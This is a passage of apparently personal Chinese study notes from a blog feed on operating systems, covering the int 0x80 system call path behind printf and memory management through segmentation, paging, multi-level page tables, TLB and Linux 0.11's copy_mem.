<li><p>中断信息存储在IDT表中，下图给出了IDT表的结构与宏代码：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659579013152.png"><br>而int 0x80中断的描述符设置代码：<code>set_gate(&amp;idt[80],15,3,&amp;system_call)</code><br>提供查看此代码可知：其<code>DPL为3</code>，所存储的偏移地址为<code>system_call</code>函数，<code>段描述符为0x0008</code>。</p>
</li>
</ol>
<h4 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h4><ol>
<li>用户使用<code>0x80中断</code>，通过查询<code>IDT表</code>获取中断代码。（<strong>CPL&#x3D;DPL&#x3D;3</strong>）</li>
<li>IDT表中存储<strong>段描述符</strong>和<strong>段偏移符</strong>，即可确定<code>CS：IP</code>以定位中断函数位置。（因为CS为0x0008，所以此时<code>CPL变为0</code>即内核特权级）</li>
<li>根据<code>CS:IP</code>确定位置后即可执行<code>system_call</code>，进入内核，使用系统调用。</li>
</ol>
<h1 id="printf的完整故事"><a href="#printf的完整故事" class="headerlink" title="printf的完整故事"></a>printf的完整故事</h1><blockquote>
<p>printf函数是一个常用的输出程序，但是其实现的流程绝对是一波三折，下面我们具体介绍。</p>
</blockquote>
<h3 id="库函数处理"><a href="#库函数处理" class="headerlink" title="库函数处理"></a>库函数处理</h3><blockquote>
<p>第一个阶段会由库函数完成，主要实现以下功能：</p>
</blockquote>
<ul>
<li>对格式化输出中的<strong>格式进行处理</strong></li>
<li>调用<code>write系统调用</code>在屏幕上输出</li>
</ul>
<p>C函数库会将<code>printf(&quot;hello world!&quot;);</code>变成如下代码：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659591235865.png"></p>
<p>注：这个阶段只是系统调用前的准备工作，为真正的系统调用准备参数等、</p>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><blockquote>
<p>主要涉及到write函数的具体实现</p>
</blockquote>
<p>将write宏展开为一段包含<code>int 0x80</code>的代码，具体如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659591426129.png"></p>
<p><strong>注</strong>：正常用户态代码是无法使用系统调用的，只有使用<code>中断（0x80)</code>，利用<strong>宏展开</strong>的方式将C代码转换成了包含中断的代码。</p>
<h3 id="中断执行"><a href="#中断执行" class="headerlink" title="中断执行"></a>中断执行</h3><blockquote>
<p>有了代码就要执行，不同的是这里要执行的是中断。</p>
</blockquote>
<p><code>int 0x80</code>的执行过程如下：</p>
<ol>
<li>通过<strong>查找IDT表</strong>中的0x80表项，获取地址和特权级。</li>
<li>跳转到<code>sys_call函数</code>执行系统调用</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659591795432.png"></p>
<p>上图给出了system_call函数的代码，这个函数一共做了下面几件事：</p>
<ol>
<li>将<code>DS、ES、FS寄存器</code>中的值入栈以便于恢复，同时更新寄存器值为内核区域段选择子。（<strong>内核代码段0x08,内核数据段0x10</strong>）</li>
<li>跳转到<code>sts_call_table</code>中的第4个系统调用即<code>sys_write</code>.至于为什么会选择第4个系统调用，因为在实现printf的库函数中定义了<code># define __NR_write=4</code>,所以在宏展开的汇编代码中指定<code>eax=4</code>，从而当做参数传递到<code>sys_call_table</code>.</li>
<li>在执行<code>sys_write</code>这个内核函数之前，需要告知其参数，这里使用<strong>内嵌汇编</strong>进行，将参数信息先保存在ebx\ecx\edx寄存器中，而后入栈即可。</li>
<li>在上图代码中有一个细节：<code>%fs=0x17</code>，这个属于<strong>段选择符</strong>，其后三位为111，即可说明其<code>CPL为3</code>，<code>指向LDT表</code>。（通过LDT表即可找到<strong>调用系统调用的用户态进程</strong>，进而完成数据交换以实现输出操作）<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1659619035389.png"></li>
</ol>
<hr>
<blockquote>
<p>写在最后：这一节主要介绍了系统调用的原理与实现。</p>
<blockquote>
<ul>
<li>系统调用就是接口，也是用户进入操作系统内核的唯一途径。</li>
<li>系统调用的实现需要借助中断来执行。</li>
<li>通过特权级来实现访问控制，借助CPL和DPL比较来实现。</li>
</ul>
</blockquote>
</blockquote>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>（第五节）操作系统--内存管理</title>
    <url>/2022/08/17/%EF%BC%88%E7%AC%AC%E4%BA%94%E8%8A%82%EF%BC%89%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F--%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong></p>
<blockquote>
<p>本篇文章主要用于记录操作系统学习过程中<strong>内存管理的部分内容</strong>，学习资料为<strong>哈工大李治军老师</strong>的课程。<br>本文中使用的图片大多来自课程视频和配套图书，<strong>只为个人学习所用</strong>。</p>
</blockquote>
</blockquote>
<h1 id="内存使用与分段"><a href="#内存使用与分段" class="headerlink" title="内存使用与分段"></a>内存使用与分段</h1><h2 id="内存是如果使用的"><a href="#内存是如果使用的" class="headerlink" title="内存是如果使用的"></a>内存是如果使用的</h2><blockquote>
<p><code>程序</code>是存储在<strong>内存</strong>中的，<code>取指-执行</code>是计算机工作的基本原理,CPU工作的同时<strong>内存也就跟着使用</strong>了。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660613413391.png"></p>
<p>如图所示，<strong>使用内存</strong>的步骤就<strong>两点</strong>：<code>将程序放入内存</code>、<code>设置PC指针使得程序执行</code></p>
<hr>
<blockquote>
<p>下面就具体介绍一下如何将查询放到内存并进行执行的</p>
</blockquote>
<p>程序放到内存只需要将<strong>磁盘</strong>中的编译完毕的文件<strong>读入内存</strong>即可。<br>如下图所示，程序放到<strong>内存中</strong>即可使用<strong>call指令</strong>进行调用。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660613424086.png"></p>
<blockquote>
<p>需要关注的是要将程序放到<strong>内存中的什么位置</strong>呢？</p>
</blockquote>
<p>上图中给了两个例子，显然下面的例子是对的，即从内存中取出一段空闲的空间来存放程序。</p>
<p>不过即便是下面的例子也有错误，因为其中的指令：<code>call 40</code>所跳转的位置是错误的，需要进行<code>重定位操作</code>。</p>
<blockquote>
<p><code>重定位</code>：保证对内存地址的正确访问，要进行地址翻译。</p>
</blockquote>
<p>前面的例子中提到的<code>call 40</code> 中的<strong>40</strong>是<code>逻辑地址</code>，在实际使用时需要进行修改，变为<code>物理地址</code>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660613435569.png"></p>
<p>在程序<code>载入时</code>进行<code>重定位操作</code>，因为我们在<code>编译时</code>往往<strong>不知道哪一段内存是空闲</strong>的。</p>
<p><strong>注</strong>：在<strong>一些嵌入式系统</strong>中可以在<strong>编译时</strong>进行重定位，因为某些程序载入的位置是固定的。</p>
<hr>
<blockquote>
<p>程序载入后还<strong>需要移动</strong>：<code>交换（swap)</code></p>
</blockquote>
<p>如下图所示，进程在使用的过程中可能因为<strong>阻塞</strong>等原因需要进行移动，这时其重定位地址就会出现问题。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660613449621.png"> </p>
<hr>
<blockquote>
<p>所以：<strong>重定位最合适的时机</strong>–<code>运行时重定位</code>（也是我们主要要介绍的）</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660613461265.png"></p>
<p><code>call 40</code> 在内存中是<strong>不变</strong>的，在<strong>运行时</strong>根据<code>base地址+offset</code>获得新的<strong>物理地址</strong>。</p>
<p>而进行<strong>地址翻译</strong>时最关键的点在于<strong>获得base基址</strong>。这个基址是<code>存储在PCB</code>中的，在<strong>创建进程</strong>时就要将申请到的地址基址放到PCB中，并在之后的<strong>切换时</strong>不断<strong>更新</strong>基址的值。</p>
<p>而在进行程序的执行时，当涉及到<strong>内存地址</strong>就要先进行<code>地址翻译</code>，即<code>基地址+offset=物理地址</code></p>
<hr>
<blockquote>
<p><strong>承上启下</strong>：</p>
<blockquote>
<p>上文介绍了内存使用的一个<strong>直观想法</strong>：<strong>将程序载入内存并进行地址翻译以执行相关程序</strong>。<br>下面就要在这个直观想法的基础上<strong>进行推进</strong>，第一个要推进的点：<code>引入分段--将程序一起载入内存吗？</code></p>
</blockquote>
</blockquote>
<h2 id="分段思想"><a href="#分段思想" class="headerlink" title="分段思想"></a>分段思想</h2><p>如下图所示，<strong>程序员眼中的程序</strong>是可以<strong>分为若干段</strong>的。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660613485904.png"></p>
<p>将程序<strong>按段分配</strong>可以<strong>独立考虑</strong>每个段的内容，并且每一个段<strong>有其各自的特点</strong>，如：<strong>代码段可读、堆栈段可以动态增长等</strong>，需要分开处理。</p>
<p>所以，程序在载入内存时也是<strong>分段进行载入</strong>的。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660613499869.png"></p>
<p>所以在进行寻址时也就不是用单纯的基址了，而是使用<strong>段基址</strong>。在<code>PCB</code>中就要存放<strong>所有段的基址</strong>。<br><strong>strong text</strong><br>这个用于<strong>存储段地址</strong>的表叫做<strong>LDT表</strong>，是每一个进程都要有的。</p>
<blockquote>
<p>GDT和LDT</p>
</blockquote>
<p><strong>操作系统层面</strong>的段地址表叫做<code>GDT</code>，每一个<strong>进程独有</strong>的段地址表叫做<code>LDT</code>,也就是我们前面讲CPU管理时的<strong>映射表</strong>.</p>
<p>所以在进程创建时，将程序分段载入内存，并将每一个段的基址存放在PCB中的LDT表，并通过这个表进行寻址。</p>
<hr>
<blockquote>
<p><strong>承上启下</strong>：</p>
<blockquote>
<p>前面我们介绍了操作系统使用内存的原理。还介绍了程序的<strong>分段机制</strong>，通过段基址和偏移获取物理地址。<br>下面我们接着进行介绍：在经过编译后程序被分为多个段，但是要写入内存还要<strong>在内存空间中找到一个空闲的区域</strong>。如何去找呢？这就是我们下面的内容。</p>
</blockquote>
</blockquote>
<h1 id="内存分区与分页"><a href="#内存分区与分页" class="headerlink" title="内存分区与分页"></a>内存分区与分页</h1><h2 id="内存分区"><a href="#内存分区" class="headerlink" title="内存分区"></a>内存分区</h2><blockquote>
<p>操作系统初始化时将内存进行分区，采取的分区策略是可变分区。在实际中，通过一些核心数据结构来管理可变分区。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660613520125.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660613531660.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660613544873.png"></p>
<p>通过<strong>空闲分区表</strong>和<strong>已分配分区表</strong>来记录内存区域信息。</p>
<blockquote>
<p>通过一些算法来适配区域申请。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660613556495.png"></p>
<p>不同的<strong>适配算法</strong>都有各自的优缺点，比如：<strong>首先适配的复杂度较低，而最佳适配的复杂度高且分割后剩余的区域较小</strong>等，但是他们<strong>没有对错</strong>，都是对的，只是要根据<strong>具体情况</strong>来进行选择。（<code>操作系统中的很多算法都无对错之分</code>）</p>
<p>例如下面<strong>这个例子</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660613568915.png"></p>
<hr>
<blockquote>
<p><strong>承上启下</strong>：</p>
<blockquote>
<p>上文我们介绍了操作系统对于内存的<strong>分区处理以及适配算法</strong>。<br>但是内存的<strong>分区机制</strong>导致内存<strong>效率较低</strong>，所以我们引入<code>分页机制</code>来解决这个问题。<br>注：<strong>分页机制</strong>是对于<code>物理内存</code>来说的，而<strong>分区机制</strong>是对于<code>虚拟内存</code>来说的，二者各有用处，而将<code>段页合并</code>是下一节的基本内容。</p>
</blockquote>
</blockquote>
<h2 id="内存分页-物理内存）"><a href="#内存分页-物理内存）" class="headerlink" title="内存分页(物理内存）"></a>内存分页(物理内存）</h2><blockquote>
<p>可变分区的问题：<code>内存碎片</code></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660613583550.png"></p>
<p>由于采取<strong>可变分区机制</strong>以及多次的<strong>段请求</strong>，导致内存中的<strong>碎片区域</strong>越来越多，最终导致即使剩余的<strong>空闲区域大于申请区域</strong>也无法完成分配，因为申请的空间必须是<strong>连续的</strong>。</p>
<p>为了解决这个问题，引入<code>内存紧缩</code>的概念，即<strong>将已分配区域连接在一起，将碎片区域合并</strong>。但是这种方法也无法从根本上解决问题，因为内存紧缩对<strong>资源的消耗很大</strong>，往往在紧缩过程中涉及到的<strong>进程无法执行</strong>，表现用户眼里就是<strong>死机</strong>。</p>
<hr>
<blockquote>
<p><strong>问题的解决</strong>：<code>申请区域离散</code></p>
</blockquote>
<p>既然无法将碎片合并，那就将申请的区域打散为多个<code>基本单元</code>，并在内存中取这些<strong>内存单元</strong>去分配，这就是<strong>内存的分页机制</strong>。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660613592900.png"></p>
<p>将内存平均分割为多个<strong>基本单元</strong>，也就是<code>页</code>，一般将<strong>4k大小</strong>区域为一个页。这种方法可以很好解决<strong>碎片区域问题</strong>，因为即便是这些碎片区域也是<strong>由页构成</strong>。</p>
<hr>
<blockquote>
<p>页已经载入内存，接下来就要进行寻址</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660613603013.png"></p>
<p>如图所示，通过<strong>页表</strong>对地址进行重定位。页表中存储着页号以及其对应的页框号。</p>
<p>在重定位的过程中，地址<strong>除以4k</strong>也就是<strong>右移12位</strong>即可得到页号，而后<strong>查询页表</strong>获取页框号最终得到<strong>物理地址</strong>。<br>页表与PCB关联且通过<code>MMU</code>自动进行运算。</p>
<hr>
<blockquote>
<p><strong>承上启下</strong>：</p>
<blockquote>
<p>前面介绍了内存的<code>分页机制</code>，可以有效<strong>解决内存碎片</strong>的问题。<br>但是分页机制<strong>也有弊端</strong>：对于现在以<strong>GB为单位</strong>的内存空间来说，以<strong>4k为基本单元</strong>进行划分，所得到的<strong>页表就会很大</strong>。而下面要介绍的<code>多级页表和快表</code>就是在面对<strong>大页表问题</strong>是提出的解决方法。多级页表和块表加上前面讲到的内容就可以构成一个可以较为高效工作的分页机制。</p>
</blockquote>
</blockquote>
<h1 id="多级页表和快表"><a href="#多级页表和快表" class="headerlink" title="多级页表和快表"></a>多级页表和快表</h1><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660617764611.png"></p>
<p>如图所示，<strong>页小空间大导致页表太大</strong>。 具体有多大呢？看下面的例子。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660617772703.png"></p>
<p>如图所示，<strong>每一个进程都要有对应的页表</strong>。根据<code>32位地址和4k单元</code>计算，一个页表的含有<code>2^20</code>个页表项，也就是<strong>4M</strong>（一个页表项大小为<strong>4B</strong>）。<br>如果<strong>运行多个进程</strong>，单单是页表存储空间就要占据很大一部分，造成<strong>空间的极大浪费</strong>。</p>
<p>但是在实际情况下，<strong>很多逻辑地址都是使用不到</strong>的。因为一般程序的<strong>代码段、数据段等都不会太大</strong>，很难达到4G的上限.<br>那么该如何进行改进呢？</p>
<blockquote>
<p>第一种尝试：<strong>只存放用到的页</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660617791361.png"></p>
<p>如图所示，我们将页表中<strong>不使用的页表项删除</strong>，得到一个较小的页表。但是尽管这种方法可以<strong>减少页表对于内存的浪费</strong>，却会造成程序执行的<strong>速度大幅度降低</strong>。</p>
<p><code>为什么会降低呢？</code>因我们需要<strong>根据页号查询页框号</strong>以获取物理地址，这时如果页表中的<strong>页号不连续</strong>，就要依次对这些内存进行比较，而<strong>多次的内存访问会降低速度</strong>。</p>
<p>所以<strong>得出结论</strong>：第一种尝试<strong>失败</strong>，必须<strong>保证页表中页号的连续</strong>，这样只需要一次即可获取到页框号。</p>
<blockquote>
<p><strong>那么怎么样可以即连续有占用内存少呢</strong>？<code>多级页表</code>就可以。这也是我们的第二种尝试。</p>
</blockquote>
<h2 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h2><blockquote>
<p><strong>多级页表</strong>可以用书的<code>章目录和节目录</code>来类别思考。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660617801763.png"></p>
<p>如图所示，<strong>32位地址</strong>分为<code>页目录号、页号、偏移</code>三部分，通过<strong>页目录号找到目标区域</strong>、通过页号在此区域得到正确的页框号，最终与偏移一起得到物理地址。</p>
<p>这种方法既可以<strong>保证页表的大小</strong>，又可以<strong>保证查询的速度</strong>。xxxxxxxx xxxxxxxxxxxx</p>
<hr>
<blockquote>
<p><strong>承上启下</strong>：</p>
<blockquote>
<p>又有问题：多级页表的<strong>多次跳转</strong>，会造成<strong>访问次数的增加</strong>，<strong>时间效率</strong>会变低。当然即便如此也要比前面提到的不连续存储要快很多。<br>为了解决这个问题：<strong>引入快表</strong>。</p>
</blockquote>
</blockquote>
<h2 id="快表"><a href="#快表" class="headerlink" title="快表"></a>快表</h2><blockquote>
<p>也可以<strong>类比我们看书</strong>，当目录很多很复杂时，我们可以<strong>记住某个章节的页数</strong>，下次直接查看即可。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660617812272.png"></p>
<p>如图所示，使用<code>TLB寄存器</code>保存一些<strong>常用的地址页数</strong>，并借助硬件实现一步得出查询结果（多个数据一起比较）。</p>
<blockquote>
<p>TLB的实现与优化</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660617822455.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660617832869.png"></p>
<p>如图所示，通过<strong>设置合适的TLB条目数</strong>以保证其命中率。</p>
<hr>
<blockquote>
<p><strong>承上启下</strong>：</p>
<blockquote>
<p>前面我们介绍了内存的<strong>分页机制和分段机制</strong>，二者各有优缺点。<br>下面我们要介绍的就是<strong>如何将这两种机制结合</strong>，取其精华用于<strong>实际的内存管理</strong>。</p>
</blockquote>
</blockquote>
<h1 id="段、页结合的实际内存管理机制"><a href="#段、页结合的实际内存管理机制" class="headerlink" title="段、页结合的实际内存管理机制"></a>段、页结合的实际内存管理机制</h1><blockquote>
<p><strong>程序员</strong>希望用<strong>段</strong>（便于管理），<strong>物理内存</strong>希望用<strong>页</strong>（保证内存的空间使用效率）</p>
</blockquote>
<h2 id="段、页如何结合"><a href="#段、页如何结合" class="headerlink" title="段、页如何结合"></a>段、页如何结合</h2><blockquote>
<p>段页结合的<strong>中转点</strong>：<code>虚拟内存</code></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660618882476.png"></p>
<p>如图所示，通过<strong>虚拟内存作为中转</strong>，实现<strong>段页的结合</strong>。</p>
<blockquote>
<p>段面向用户、页面向硬件:将<strong>程序放到内存</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660705676828.png"></p>
<p>如图所示，使用虚拟内存进行<strong>段划分</strong>并<strong>面向用户</strong>使用；而后将虚拟内存中的各个区域<strong>映射到物理地址</strong>的各个页上。</p>
<blockquote>
<p> 段页同时存在的<strong>重定位操作</strong>：保证<strong>程序的正确执行</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660705687633.png"></p>
<p>如图所示，重定位操作的大体流程：通过查询<code>段表</code>将<code>逻辑地址</code>转换为<code>虚拟地址</code>；而后通过<code>页表</code>将<code>虚拟地址</code>转换为实际<code>物理地址</code>。</p>
<h2 id="内存管理的流程"><a href="#内存管理的流程" class="headerlink" title="内存管理的流程"></a>内存管理的流程</h2><blockquote>
<p><strong>流程框架</strong>建立：</p>
<blockquote>
<p>先通过<strong>拓扑</strong>建立内存管理的流程，包括：<strong>程序载入和程序执行(地址翻译）</strong>，而后通过<strong>代码进行实现</strong>。</p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660705700829.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660705710690.png"></p>
<p>如图所示，<strong>内存管理的流程</strong>：</p>
<ol>
<li>先对虚拟地址进行<strong>分区操作</strong>，而后通过<strong>适配算法</strong>得到<strong>空闲区域</strong>分配给进程</li>
<li><strong>建立段表（LDT）</strong>完成虚拟内存与程序段之间的映射</li>
<li>将<strong>虚拟内存</strong>中的各个分区均分成多个页，并与物理内存中的空闲页框绑定。</li>
<li><strong>建立页表</strong>来记录<strong>虚拟内存页和物理内存页框</strong>之间的映射关系</li>
<li>前面4步已经完成了程序的载入，这一步要完成<strong>程序的执行</strong>。</li>
</ol>
<blockquote>
<p>在介绍<strong>代码实现</strong>之前，我们先来看一下<strong>如何执行</strong>载入内存中的程序</p>
</blockquote>
<p>要想执行程序，就只需要将<strong>程序放到CPU中</strong>即可，这一点在<strong>CPU管理</strong>时已经讲过。所以，这里我们提到程序执行更加需要关注的是：<code>地址翻译</code>。（代码中涉及到地址的地方都要进行地址翻译才可以得到实际物理地址，也<strong>只有物理地址才可以被实际操作</strong>）</p>
<p>在<strong>段页结合的内存管理机制</strong>下，<strong>地址翻译</strong>也就是重定位需要<strong>分两步进行</strong>：</p>
<ol>
<li>首先完成<code>逻辑地址到虚拟地址的转换</code>。这个例子中逻辑地址为：<code>CS:40</code>，通过<strong>查询LDT表</strong>获取到<strong>代码段的基址</strong>，而后<strong>与偏移相加</strong>得到虚拟地址。</li>
<li>将<code>虚拟地址与物理地址进行转换</code>。虚拟地址已经知道，将其除以页大小即可<strong>得到页号</strong>，而后<strong>查询页表</strong>即可得到<strong>页框号</strong>，将其与偏移加和得到实际物理地址。</li>
</ol>
<p><strong>注</strong>：在实际的计算机中，我们只需要给<code>LDTR</code>和<code>CR3</code>寄存器分别赋值为<code>LDT表初始地址</code>和<code>页表初始地址</code>，<code>MMU</code>就会在遇到地址时<strong>自动完成地址翻译</strong>。</p>
<hr>
<h2 id="内存管理的代码实现"><a href="#内存管理的代码实现" class="headerlink" title="内存管理的代码实现"></a>内存管理的代码实现</h2><blockquote>
<p>具体代码实现：<strong>从fork()开始</strong></p>
<blockquote>
<p>这里主要关注与<strong>内存管理</strong>相关的代码，其他有关<strong>CPU管理</strong>的部分不涉及。</p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660699006080.png"></p>
<p>上图所示代码就是<code>fork()</code>创建进程时的<strong>核心函数</strong>，通过<code>copy_process()</code>完成<strong>PCB的创建</strong>、<strong>内核栈的分配和初始化</strong>、<strong>内核栈与PCB的关联</strong>等。同时，通过<strong>copy_mem()<strong>完成</strong>进程空间的分配</strong>。</p>
<p>我们来<strong>分析一下代码</strong>，主要是<code>copy_mem()</code>函数：</p>
<p>先来看一下这个<code>copy_mem函数</code>的<strong>具体代码</strong>：</p>
<blockquote>
<p>代码部分1：<strong>虚存分割与段表建立</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660699333975.png"></p>
<p>分析上图代码：<strong>先定义一个变量</strong>、而后为这个<strong>变量赋值</strong>、之后通过<code>set_base()</code>函数为<strong>LDT表写入内容</strong>。所以不难看出，这个函数就是为了<code>申请段空间而后建立段表</code>。</p>
<p>代码中<code>nr</code>指的是<strong>进程号</strong>，即为每一个进程分配64M大小空间，并根据进程号依次分配。分配后可以得到如下图的<strong>虚拟内存视图</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660699625420.png"></p>
<p>当然，上图所示是<strong>最简单的虚拟内存分割方法</strong>，在实际中往往采取<strong>很多算法</strong>进行内存分配，不过这不是我们现在要考虑的，我们只需要知道<strong>此函数完成了虚拟内存的分配与段表的建立</strong>。</p>
<blockquote>
<p>代码部分2：<strong>内存分页与页表映射</strong></p>
</blockquote>
<p>先来<strong>看一下代码</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660699867034.png"></p>
<p>通过代码不难看出为什么这个函数叫做<code>copy_mem()</code>，因为子进程创建时其内存空间是<strong>复制父进程的</strong>。代码中的<code>get_base(current-&gt;led[2])</code>就是为了<strong>获取父进程虚存空间与内存页框的映射关系</strong>，而后通过<code>copy_page_tables()</code>函数将其复制给<code>new_data_base</code>也就是<strong>子进程的页表</strong>。</p>
<p>至于<strong>如何复制</strong>的，这个过程也很简单，有<strong>代码如下</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660702640359.png"></p>
<p>上图代码将父进程页表复制给子进程，主要通过<strong>两个for循环</strong>实现，<strong>外层循环</strong>实现<strong>页目录的复制</strong>、<strong>内层循环</strong>实现<strong>页表项的复制</strong>。</p>
<p><strong>具体的流程</strong>如下：</p>
<ol>
<li>先获取<strong>父进程页目录表的基址</strong>。（在操作系统启动时<code>head.s</code>中有初始化页目录表的代码，其中将页目录表放在<strong>内存的0地址</strong>处）</li>
<li>而后要<strong>获取页目录号</strong>。这一点是通过查询父进程的<strong>ldt表</strong>获得的，ldt表中存储着32位地址，其中前10位为页目录号，所以代码中使用<code>from&gt;&gt;20x4</code>得到所需页目录在页目录表的位置，并将其<strong>复制给子进程</strong>。</li>
<li>通过页目录表中存储的地址也就是<strong>页表基址</strong>与<strong>页号</strong>即可获取<strong>物理内存的页框号</strong>，将其填写到子进程页表项中即可。</li>
</ol>
<p>经过上述过程即可完成子进程<strong>内存空间的分配</strong>，得到以下<strong>内存视图</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660703383405.png"></p>
<blockquote>
<p>代码部分3：父子进程<strong>程序的执行</strong></p>
</blockquote>
<p>上述代码实现了<strong>子进程内存空间的分配与LDT表和页目录、页表的建立</strong>。下面我们就要<strong>在此基础上执行代码</strong>：</p>
<blockquote>
<blockquote>
<p>我们以<code>*p= 7</code> 为例</p>
</blockquote>
</blockquote>
<p>假设p的<strong>逻辑地址为300h</strong>，要完成上述代码，需要<strong>以下两步</strong>：</p>
<ol>
<li>首先根据逻辑地址完成<strong>地址翻译</strong>。具体为：查<strong>询LDT[2]<strong>获取到</strong>数据段基址</strong>，假设为0x1000000,所以可以得到<strong>虚拟地址</strong>为0x100300；然后根据这个虚拟地址<strong>获取物理地址</strong>，具体为：通过前10位得到页目录号，通过中间10位得到页号，通过偏移得到物理地址，当然这个过程<code>由MMU自动执行获取</code>。</li>
<li>获取到物理地址后，即可由<strong>数据总线</strong>将7发送到此地址处，完成程序.</li>
</ol>
<blockquote>
<blockquote>
<p>我们在上述<strong>代码基础</strong>上继续执行：<code>父子进程都要执行prinf(p)</code></p>
</blockquote>
</blockquote>
<p>程序执行的流程：根据p的逻辑地址翻译后得到物理地址，而后通过地址总线和数据总线完成数据传输，最后进行打印，并且打印的结果都是7.</p>
<p>为什么打印的结果一样呢?因为父子进程定位到的物理地址是一样的，本质还是我们上面介绍的代码实现：通过复制的方式实现子进程内存空间的分配。</p>
<blockquote>
<blockquote>
